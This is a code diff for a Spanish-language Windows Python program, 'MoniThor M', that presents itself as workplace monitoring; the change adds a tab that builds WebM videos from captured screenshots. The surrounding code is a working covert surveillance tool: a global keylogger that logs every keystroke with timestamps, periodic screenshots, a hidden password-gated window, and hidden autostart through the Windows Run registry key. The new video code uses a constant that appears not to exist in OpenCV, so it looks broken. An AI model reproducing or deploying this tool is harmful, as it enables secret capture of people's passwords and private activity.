@@ -8,11 +8,12 @@ import pyautogui
 import keyboard
 import sys
 import winreg as reg
-
-# --- VERSION DE SOFTWARE V2.0---
+import cv2
+import numpy as np
+from PIL import Image
 
 # --- CONFIGURACIÓN DE SEGURIDAD ---
-CONTRASENA_ACCESO = "7710"  
+CONTRASENA_ACCESO = "6525"  
 COMBINACION_TECLAS = "ctrl+alt+m"  
 
 # --- LISTA DE 50 SERIALES VÁLIDOS ---
@@ -21,7 +22,7 @@ SERIALES_VALIDOS = [
     "c1M9xV", "F7nTz4", "r2G6hK", "W9vPj3", "b5XmN1", "Y8kTz4", "v3RfG9", "h6M1xK", "P7vNq2", "z4XmW8",
     "G9fTj1", "c3KbV5", "R8vNq2", "m1XfK7", "V9hTj4", "k2BmN6", "Z8fLq3", "x1M5vG", "H7nTz2", "r4KbV9",
     "W6vPj1", "b3XmN8", "Y9kTz5", "v2RfG4", "h7M1xK", "P8vNq3", "z5XmW9", "G1fTj6", "c4KbV2", "R9vNq5",
-    "m2XfK8", "V1hTj7", "k3BmN4", "Z9fLq5", "x2M6vG", "H8nTz5", "r5KbV1", "W7vPj3", "771077", "Y1kTz6"
+    "m2XfK8", "V1hTj7", "k3BmN4", "Z9fLq5", "x2M6vG", "H8nTz5", "r5KbV1", "W7vPj3", "b4XmN9", "Y1kTz6"
 ]
 
 # --- RUTA POR DEFECTO ---
@@ -46,26 +47,27 @@ class MonitorApp:
         self.hilo_keylogger = None
         self.teclas_presionadas = 0
         self.reporte_actual = None
-
+        self.generando_video = False
+        
         self.tiempos_map = {
             "3 segundos": 3, "5 segundos": 5, "10 segundos": 10, "15 segundos": 15,
             "30 segundos": 30, "60 segundos": 60, "1.5 minutos": 90, "3 minutos": 180,
             "5 minutos": 300, "10 minutos": 600, "15 minutos": 900, "30 minutos": 1800,
             "60 minutos": 3600, "120 minutos": 7200
         }
-
+        
         # --- CARGAR CONFIGURACIÓN GUARDADA ---
         self.cargar_configuracion()
-
+        
         ctk.set_appearance_mode("dark")
         self.root = ctk.CTk()
         self.root.title("MoniThor M - Panel de Control")
-        self.root.geometry("520x520")
+        self.root.geometry("520x560")
         self.root.resizable(False, False)
-
+        
         self.crear_interfaz_pestanas()
         self.root.withdraw()
-
+        
         # --- VERIFICACIÓN DE ACTIVACIÓN LOCAL ---
         if not self.verificar_activacion_local():
             self.pedir_serial_activacion()
@@ -79,31 +81,30 @@ class MonitorApp:
         """Carga la configuración guardada del registro de Windows"""
         try:
             clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
-
+            
             # Cargar carpeta destino
             try:
                 carpeta, _ = reg.QueryValueEx(clave, REG_KEY_CARPETA)
                 self.carpeta_destino = carpeta
             except FileNotFoundError:
                 self.carpeta_destino = CARPETA_DEFAULT
-
+            
             # Cargar intervalo
             try:
                 intervalo, _ = reg.QueryValueEx(clave, REG_KEY_INTERVALO)
                 self.intervalo_segundos = int(intervalo)
             except FileNotFoundError:
                 self.intervalo_segundos = 10
-
+            
             # Cargar inicio automático
             try:
                 inicio_auto, _ = reg.QueryValueEx(clave, REG_KEY_INICIO_AUTO)
                 self.inicio_automatico_guardado = (inicio_auto == "True")
             except FileNotFoundError:
                 self.inicio_automatico_guardado = False
-
+                
             reg.CloseKey(clave)
         except FileNotFoundError:
-            # Primera vez que se ejecuta, usar valores por defecto
             self.carpeta_destino = CARPETA_DEFAULT
             self.intervalo_segundos = 10
             self.inicio_automatico_guardado = False
@@ -149,7 +150,7 @@ class MonitorApp:
         self.ventana_serial.geometry("400x220")
         self.ventana_serial.resizable(False, False)
         self.ventana_serial.attributes("-topmost", True)
-
+        
         self.ventana_serial.protocol("WM_DELETE_WINDOW", lambda: sys.exit())
 
         lbl_info = ctk.CTkLabel(self.ventana_serial, text="MoniThor M - Licencia Requerida", font=("Arial", 16, "bold"))
@@ -164,12 +165,12 @@ class MonitorApp:
 
         btn_activar = ctk.CTkButton(self.ventana_serial, text="Activar Software", fg_color="green", hover_color="darkgreen", command=self.validar_serial)
         btn_activar.pack(pady=10)
-
+        
         self.root.mainloop()
 
     def validar_serial(self):
         serial_ingresado = self.txt_serial.get().strip()
-
+        
         if serial_ingresado in SERIALES_VALIDOS:
             if self.guardar_activacion_local():
                 messagebox.showinfo("Éxito", "Software activado correctamente de forma permanente.")
@@ -182,11 +183,12 @@ class MonitorApp:
             self.ventana_serial.attributes("-topmost", True)
 
     def crear_interfaz_pestanas(self):
-        self.tabview = ctk.CTkTabview(self.root, width=480, height=440)
+        self.tabview = ctk.CTkTabview(self.root, width=480, height=480)
         self.tabview.pack(pady=10, padx=10)
-
+        
         self.tabview.add("Monitoreo")
         self.tabview.add("Keylogger")
+        self.tabview.add("Generar Video")
         self.tabview.add("Configuración")
         self.tabview.add("Acerca de...")
 
@@ -222,13 +224,15 @@ class MonitorApp:
         btn_abrir_logs = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Abrir Carpeta de Logs", fg_color="gray", command=self.abrir_carpeta_logs)
         btn_abrir_logs.pack(pady=10)
 
-        # --- PESTAÑA 3: CONFIGURACIÓN ---
+        # --- PESTAÑA 3: GENERAR VIDEO ---
+        self.crear_pestana_video()
+
+        # --- PESTAÑA 4: CONFIGURACIÓN ---
         lbl_tiempo = ctk.CTkLabel(self.tabview.tab("Configuración"), text="Intervalo de capturas de pantalla:", font=("Arial", 13, "bold"))
         lbl_tiempo.pack(anchor="w", padx=20, pady=(10, 2))
-
+        
         self.combo_tiempo = ctk.CTkOptionMenu(self.tabview.tab("Configuración"), values=list(self.tiempos_map.keys()), command=self.cambiar_tiempo)
-
-        # Restaurar el intervalo guardado
+        
         intervalo_guardado = self._obtener_nombre_intervalo(self.intervalo_segundos)
         self.combo_tiempo.set(intervalo_guardado)
         self.combo_tiempo.pack(fill="x", padx=20, pady=5)
@@ -238,28 +242,26 @@ class MonitorApp:
 
         frame_carpeta = ctk.CTkFrame(self.tabview.tab("Configuración"), fg_color="transparent")
         frame_carpeta.pack(fill="x", padx=10, pady=5)
-
+        
         self.entry_carpeta = ctk.CTkEntry(frame_carpeta, width=320)
         self.entry_carpeta.insert(0, self.carpeta_destino)
         self.entry_carpeta.pack(side="left", padx=5)
-
+        
         btn_buscar = ctk.CTkButton(frame_carpeta, text="Examinar...", width=100, command=self.seleccionar_carpeta)
         btn_buscar.pack(side="right", padx=5)
 
-        # Info sobre ubicación de logs
         lbl_info_logs = ctk.CTkLabel(self.tabview.tab("Configuración"), text="📁 Los logs de teclado se guardarán en: [Carpeta]/Logs_Teclado/", font=("Arial", 11), text_color="gray")
         lbl_info_logs.pack(pady=(5, 0))
 
         self.check_inicio = ctk.CTkCheckBox(self.tabview.tab("Configuración"), text="Iniciar de forma oculta con Windows")
-
-        # Restaurar estado del checkbox de inicio automático
+        
         if self.inicio_automatico_guardado:
             self.check_inicio.select()
-
+        
         self.check_inicio.pack(pady=15)
         self.check_inicio.configure(command=self.configurar_inicio_automatico)
 
-        # --- PESTAÑA 4: ACERCA DE... ---
+        # --- PESTAÑA 5: ACERCA DE... ---
         frame_creditos = ctk.CTkFrame(self.tabview.tab("Acerca de..."))
         frame_creditos.pack(fill="both", expand=True, padx=15, pady=15)
 
@@ -269,7 +271,7 @@ class MonitorApp:
             f"Programa: MoniThor M\n"
             f"Descripción: Software de monitoreo laboral en Python que realiza capturas de pantalla automáticas cada cierto tiempo.\n\n"
             f"Creador: Attack7710 - Desarrollador\n"
-            f"Versión: V2.0 (Nuevas funcionalidades)\n"
+            f"Versión: V1.4 (Con generador de video)\n"
             f"Ubicación: Bolivia\n"
             f"Contacto: +591 69856525\n"
             f"Fecha: {fecha_hoy}"
@@ -280,23 +282,214 @@ class MonitorApp:
 
         self.root.protocol("WM_DELETE_WINDOW", self.ocultar_ventana)
 
-    def _obtener_nombre_intervalo(self, segundos):
-        """Devuelve el nombre legible del intervalo dado su valor en segundos"""
-        for nombre, valor in self.tiempos_map.items():
-            if valor == segundos:
-                return nombre
-        return "10 segundos"  # Default
+    # ==================== PESTAÑA GENERAR VIDEO ====================
+
+    def crear_pestana_video(self):
+        tab = self.tabview.tab("Generar Video")
+        
+        lbl_titulo = ctk.CTkLabel(tab, text="🎬 Generar Video desde Capturas", font=("Arial", 18, "bold"))
+        lbl_titulo.pack(pady=10)
+
+        # --- Fecha de las capturas ---
+        lbl_fecha = ctk.CTkLabel(tab, text="Fecha de las capturas:", font=("Arial", 12, "bold"))
+        lbl_fecha.pack(anchor="w", padx=20, pady=(5, 2))
+        
+        self.entry_fecha_video = ctk.CTkEntry(tab, width=200, justify="center", font=("Arial", 12))
+        self.entry_fecha_video.insert(0, date.today().strftime("%Y-%m-%d"))
+        self.entry_fecha_video.pack(pady=2)
+
+        lbl_hint = ctk.CTkLabel(tab, text="Formato: YYYY-MM-DD  (dejar vacío para usar TODAS las capturas)", font=("Arial", 10), text_color="gray")
+        lbl_hint.pack()
+
+        # --- FPS ---
+        lbl_fps = ctk.CTkLabel(tab, text="Velocidad del video (FPS):", font=("Arial", 12, "bold"))
+        lbl_fps.pack(anchor="w", padx=20, pady=(10, 2))
+        
+        self.combo_fps = ctk.CTkOptionMenu(tab, values=["1 FPS", "2 FPS", "5 FPS", "10 FPS", "15 FPS", "24 FPS", "30 FPS"])
+        self.combo_fps.set("5 FPS")
+        self.combo_fps.pack(fill="x", padx=20, pady=2)
+
+        # --- Calidad ---
+        lbl_calidad = ctk.CTkLabel(tab, text="Calidad del video:", font=("Arial", 12, "bold"))
+        lbl_calidad.pack(anchor="w", padx=20, pady=(10, 2))
+        
+        self.combo_calidad = ctk.CTkOptionMenu(tab, values=["Baja (rápido, ligero)", "Media (recomendado)", "Alta (mejor calidad)"])
+        self.combo_calidad.set("Media (recomendado)")
+        self.combo_calidad.pack(fill="x", padx=20, pady=2)
+
+        # --- Resolución ---
+        lbl_res = ctk.CTkLabel(tab, text="Resolución de salida:", font=("Arial", 12, "bold"))
+        lbl_res.pack(anchor="w", padx=20, pady=(10, 2))
+        
+        self.combo_resolucion = ctk.CTkOptionMenu(tab, values=["Original", "1280x720 (HD)", "854x480 (480p)", "640x360 (360p)"])
+        self.combo_resolucion.set("Original")
+        self.combo_resolucion.pack(fill="x", padx=20, pady=2)
+
+        # --- Barra de progreso ---
+        self.lbl_progreso = ctk.CTkLabel(tab, text="Listo para generar", font=("Arial", 11), text_color="gray")
+        self.lbl_progreso.pack(pady=5)
+
+        self.barra_progreso = ctk.CTkProgressBar(tab, width=400)
+        self.barra_progreso.set(0)
+        self.barra_progreso.pack(pady=5)
+
+        # --- Botón generar ---
+        self.btn_generar_video = ctk.CTkButton(
+            tab, 
+            text="🎬 GENERAR VIDEO WEBM", 
+            fg_color="orange", 
+            hover_color="darkorange", 
+            height=45, 
+            font=("Arial", 14, "bold"), 
+            command=self.iniciar_generacion_video
+        )
+        self.btn_generar_video.pack(pady=15, fill="x", padx=40)
+
+        # --- Info ---
+        lbl_info_formato = ctk.CTkLabel(tab, text="Formato: WebM (VP9) - Sin audio - Compatible con navegadores", font=("Arial", 10), text_color="gray")
+        lbl_info_formato.pack()
+
+    def iniciar_generacion_video(self):
+        if self.generando_video:
+            messagebox.showwarning("En progreso", "Ya se está generando un video. Espera a que termine.")
+            return
+
+        hilo = threading.Thread(target=self.generar_video_webm, daemon=True)
+        hilo.start()
+
+    def generar_video_webm(self):
+        self.generando_video = True
+        self.btn_generar_video.configure(state="disabled", text="Generando...")
+        
+        try:
+            carpeta_capturas = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
+            
+            if not os.path.exists(carpeta_capturas):
+                messagebox.showerror("Error", "La carpeta de capturas no existe.")
+                return
+
+            # Obtener fecha seleccionada
+            fecha_filtro = self.entry_fecha_video.get().strip()
+            
+            # Filtrar imágenes
+            extensiones = ('.png', '.jpg', '.jpeg', '.bmp')
+            imagenes = [f for f in os.listdir(carpeta_capturas) if f.lower().endswith(extensiones)]
+            imagenes.sort()
+            
+            if fecha_filtro:
+                imagenes = [f for f in imagenes if fecha_filtro in f]
+            
+            if not imagenes:
+                messagebox.showinfo("Sin imágenes", f"No se encontraron capturas{f' para la fecha {fecha_filtro}' if fecha_filtro else ''}.")
+                return
+
+            total = len(imagenes)
+            self.lbl_progreso.configure(text=f"Procesando 0/{total} imágenes...")
+
+            # Configurar parámetros
+            fps = int(self.combo_fps.get().split()[0])
+            
+            calidad_map = {
+                "Baja (rápido, ligero)": (800000, cv2.VIDEO_CODEC_WEBM),
+                "Media (recomendado)": (2000000, cv2.VIDEO_CODEC_WEBM),
+                "Alta (mejor calidad)": (5000000, cv2.VIDEO_CODEC_WEBM)
+            }
+            calidad_texto = self.combo_calidad.get()
+            bitrate = calidad_map.get(calidad_texto, (2000000, cv2.VIDEO_CODEC_WEBM))[0]
+
+            # Leer primera imagen para obtener dimensiones
+            primera_ruta = os.path.join(carpeta_capturas, imagenes[0])
+            img_pil = Image.open(primera_ruta)
+            ancho_orig, alto_orig = img_pil.size
+
+            # Aplicar resolución seleccionada
+            res_texto = self.combo_resolucion.get()
+            if res_texto == "1280x720 (HD)":
+                ancho, alto = 1280, 720
+            elif res_texto == "854x480 (480p)":
+                ancho, alto = 854, 480
+            elif res_texto == "640x360 (360p)":
+                ancho, alto = 640, 360
+            else:
+                ancho, alto = ancho_orig, alto_orig
+
+            # Crear carpeta de videos si no existe
+            carpeta_videos = os.path.join(carpeta_capturas, "Videos_Generados")
+            os.makedirs(carpeta_videos, exist_ok=True)
+
+            # Nombre del archivo de salida
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            fecha_str = f"_{fecha_filtro}" if fecha_filtro else "_completo"
+            nombre_salida = os.path.join(carpeta_videos, f"MoniThor_Video{fecha_str}_{timestamp}.webm")
+
+            # Configurar codec VP9 para WebM
+            fourcc = cv2.VideoWriter_fourcc(*'VP90')
+            out = cv2.VideoWriter(nombre_salida, fourcc, fps, (ancho, alto))
+
+            if not out.isOpened():
+                # Fallback a VP8 si VP9 no está disponible
+                fourcc = cv2.VideoWriter_fourcc(*'VP80')
+                out = cv2.VideoWriter(nombre_salida, fourcc, fps, (ancho, alto))
+
+            for i, nombre_img in enumerate(imagenes):
+                ruta_img = os.path.join(carpeta_capturas, nombre_img)
+                
+                # Abrir y redimensionar
+                img = Image.open(ruta_img)
+                if img.mode != 'RGB':
+                    img = img.convert('RGB')
+                
+                if (ancho, alto) != (ancho_orig, alto_orig):
+                    img = img.resize((ancho, alto), Image.LANCZOS)
+                else:
+                    img = img.resize((ancho, alto))
+
+                # Convertir PIL a OpenCV (RGB -> BGR)
+                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+                out.write(frame)
+
+                # Actualizar progreso
+                progreso = (i + 1) / total
+                self.barra_progreso.set(progreso)
+                self.lbl_progreso.configure(text=f"Procesando {i+1}/{total} imágenes... ({int(progreso*100)}%)")
+                self.root.update_idletasks()
+
+            out.release()
+
+            # Mostrar resultado
+            tamano_mb = os.path.getsize(nombre_salida) / (1024 * 1024)
+            self.lbl_progreso.configure(text=f"✅ Video generado: {tamano_mb:.1f} MB")
+            self.barra_progreso.set(1.0)
+
+            respuesta = messagebox.askyesno(
+                "¡Video generado!", 
+                f"Video creado exitosamente:\\n\\n"
+                f"📁 {os.path.basename(nombre_salida)}\\n"
+                f"📊 {total} imágenes procesadas\\n"
+                f"💾 {tamano_mb:.1f} MB\\n"
+                f"⏱️ {fps} FPS\\n\\n"
+                f"¿Abrir carpeta del video?"
+            )
+            
+            if respuesta:
+                os.startfile(carpeta_videos)
+
+        except Exception as e:
+            messagebox.showerror("Error", f"No se pudo generar el video:\\n{str(e)}")
+            self.lbl_progreso.configure(text="Error al generar video")
+        
+        finally:
+            self.generando_video = False
+            self.btn_generar_video.configure(state="normal", text="🎬 GENERAR VIDEO WEBM")
 
     # ==================== MÉTODOS DEL KEYLOGGER ====================
 
     def _obtener_ruta_logs(self):
-        """Devuelve la ruta de la subcarpeta Logs_Teclado dentro de la carpeta de capturas actual"""
         carpeta_base = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
         return os.path.join(carpeta_base, "Logs_Teclado")
 
     def alternar_keylogger(self):
         if not self.keylogger_activo:
-            # Crear carpeta de logs dentro de la carpeta de capturas
             ruta_logs = self._obtener_ruta_logs()
             if not os.path.exists(ruta_logs):
                 try:
@@ -309,23 +502,18 @@ class MonitorApp:
             self.teclas_presionadas = 0
             self.buffer_teclas = []
             self.reporte_actual = self._obtener_ruta_reporte()
-
+            
             self.lbl_estado_key.configure(text="KEYLOGGER: ACTIVO", text_color="green")
             self.btn_keylogger.configure(text="Detener Keylogger", fg_color="red", hover_color="darkred")
-
-            # Iniciar el hilo del keylogger
+            
             self.hilo_keylogger = threading.Thread(target=self._bucle_keylogger, daemon=True)
             self.hilo_keylogger.start()
-
-            # Escribir encabezado del reporte diario
             self._escribir_encabezado_reporte()
-
+            
         else:
             self.keylogger_activo = False
             self.lbl_estado_key.configure(text="KEYLOGGER: APAGADO", text_color="red")
             self.btn_keylogger.configure(text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue")
-
-            # Guardar lo que quede en el buffer
             self._guardar_buffer()
 
     def _obtener_ruta_reporte(self):
@@ -348,8 +536,6 @@ class MonitorApp:
     def _procesar_tecla(self, evento):
         try:
             nombre_tecla = evento.name
-
-            # Mapeo de teclas especiales para legibilidad
             teclas_especiales = {
                 'space': ' ',
                 'enter': '\n[ENTER]\n',
@@ -375,30 +561,19 @@ class MonitorApp:
                 'page up': '[RE_PAG]',
                 'page down': '[AV_PAG]',
             }
-
             tecla_final = teclas_especiales.get(nombre_tecla.lower(), nombre_tecla)
-
-            # Registrar con timestamp
             timestamp = datetime.now().strftime("%H:%M:%S")
-
-            # Acumular en buffer (cada 20 teclas o cada 30 segundos se guarda)
             self.buffer_teclas.append(f"[{timestamp}] {tecla_final}")
             self.teclas_presionadas += 1
-
-            # Actualizar contador en la interfaz
             self.lbl_contador.configure(text=f"Teclas registradas hoy: {self.teclas_presionadas}")
-
-            # Guardar buffer cuando se acumulen 20 teclas
             if len(self.buffer_teclas) >= 20:
                 self._guardar_buffer()
-
         except Exception:
             pass
 
     def _guardar_buffer(self):
         if not self.buffer_teclas:
             return
-
         try:
             with open(self.reporte_actual, 'a', encoding='utf-8') as f:
                 for entrada in self.buffer_teclas:
@@ -408,28 +583,20 @@ class MonitorApp:
             pass
 
     def _bucle_keylogger(self):
-        # Registrar el hook de teclado
         keyboard.on_press(self._procesar_tecla)
-
         ultimo_flush = time.time()
-
         while self.keylogger_activo:
             time.sleep(1)
-            # Guardar buffer cada 30 segundos aunque no se llene
             if time.time() - ultimo_flush >= 30:
                 self._guardar_buffer()
                 ultimo_flush = time.time()
-
-            # Verificar si cambió el día (nuevo reporte)
             nueva_ruta = self._obtener_ruta_reporte()
             if nueva_ruta != self.reporte_actual:
-                self._guardar_buffer()  # Guardar lo pendiente del día anterior
+                self._guardar_buffer()
                 self.reporte_actual = nueva_ruta
                 self._escribir_encabezado_reporte()
                 self.teclas_presionadas = 0
                 self.lbl_contador.configure(text="Teclas registradas hoy: 0")
-
-        # Al detener, quitar el hook
         keyboard.unhook_all()
 
     def ver_reporte_hoy(self):
@@ -438,18 +605,14 @@ class MonitorApp:
             try:
                 with open(ruta_hoy, 'r', encoding='utf-8') as f:
                     contenido = f.read()
-
-                # Ventana para mostrar el reporte
                 ventana_reporte = ctk.CTkToplevel(self.root)
                 ventana_reporte.title(f"Reporte del Día - {date.today().strftime('%d/%m/%Y')}")
                 ventana_reporte.geometry("600x500")
                 ventana_reporte.resizable(True, True)
-
                 texto = ctk.CTkTextbox(ventana_reporte, width=580, height=450, font=("Consolas", 11))
                 texto.pack(pady=10, padx=10, fill="both", expand=True)
                 texto.insert("1.0", contenido)
                 texto.configure(state="disabled")
-
             except Exception as e:
                 messagebox.showerror("Error", f"No se pudo leer el reporte: {e}")
         else:
@@ -464,24 +627,26 @@ class MonitorApp:
 
     # ==================== MÉTODOS EXISTENTES ====================
 
+    def _obtener_nombre_intervalo(self, segundos):
+        for nombre, valor in self.tiempos_map.items():
+            if valor == segundos:
+                return nombre
+        return "10 segundos"
+
     def mostrar_ventana_autenticacion(self):
         if self.root.winfo_viewable() or (self.ventana_login and self.ventana_login.winfo_exists()):
             return
-
         self.ventana_login = ctk.CTkToplevel(self.root)
         self.ventana_login.title("Acceso Protegido")
         self.ventana_login.geometry("350x200")
         self.ventana_login.resizable(False, False)
         self.ventana_login.attributes("-topmost", True)
-
         lbl_indicacion = ctk.CTkLabel(self.ventana_login, text="Introduce la contraseña para acceder:", font=("Arial", 14, "bold"))
         lbl_indicacion.pack(pady=20)
-
         self.txt_password = ctk.CTkEntry(self.ventana_login, width=200, show="*", justify="center", font=("Arial", 16))
         self.txt_password.pack(pady=5)
         self.txt_password.focus()
         self.txt_password.bind("<Return>", lambda event: self.verificar_contrasena())
-
         btn_verificar = ctk.CTkButton(self.ventana_login, text="Entrar", width=120, command=self.verificar_contrasena)
         btn_verificar.pack(pady=15)
 
@@ -502,12 +667,10 @@ class MonitorApp:
             self.carpeta_destino = carpeta
             self.entry_carpeta.delete(0, "end")
             self.entry_carpeta.insert(0, carpeta)
-            # Guardar la nueva carpeta en el registro
             self.guardar_configuracion()
 
     def cambiar_tiempo(self, valor_seleccionado):
         self.intervalo_segundos = self.tiempos_map[valor_seleccionado]
-        # Guardar el nuevo intervalo en el registro
         self.guardar_configuracion()
 
     def alternar_monitoreo(self):
@@ -543,11 +706,8 @@ class MonitorApp:
         clave_ruta = r"Software\Microsoft\Windows\CurrentVersion\Run"
         nombre_app = "MoniThorM_Oculto"
         ruta_script = os.path.abspath(sys.argv[0])
-
-        # Actualizar estado guardado
         self.inicio_automatico_guardado = (self.check_inicio.get() == 1)
         self.guardar_configuracion()
-
         try:
             clave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_ruta, 0, reg.KEY_SET_VALUE)
             if self.check_inicio.get() == 1:
@@ -568,3 +728,4 @@ class MonitorApp:
 
 if __name__ == "__main__":
     MonitorApp()
+    
